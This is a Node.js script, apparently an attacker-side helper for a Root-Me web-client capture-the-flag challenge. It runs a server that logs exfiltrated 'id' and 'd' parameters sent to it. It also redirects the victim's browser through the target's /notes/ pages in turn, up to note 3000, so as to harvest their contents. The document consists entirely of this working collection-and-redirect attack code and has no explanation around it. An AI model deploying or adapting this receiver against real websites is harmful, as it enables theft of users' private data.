const http = require("http");

const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";

const server = http.createServer((req, res) => {
    const url = new URL(req.url, "http://localhost");

    const id = url.searchParams.get("id");
    const data = url.searchParams.get("d");
    const next = url.searchParams.get("next");

    console.log("-----");
    console.log("ID:", id);
    console.log("DATA:", data);

    if (!next || parseInt(next) > 3000) {
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end("done");
        return;
    }

    res.writeHead(302, {
        Location: TARGET + "/notes/" + next
    });

    res.end();
});

server.listen(3000, () => {
    console.log("Server running on port 3000");
});
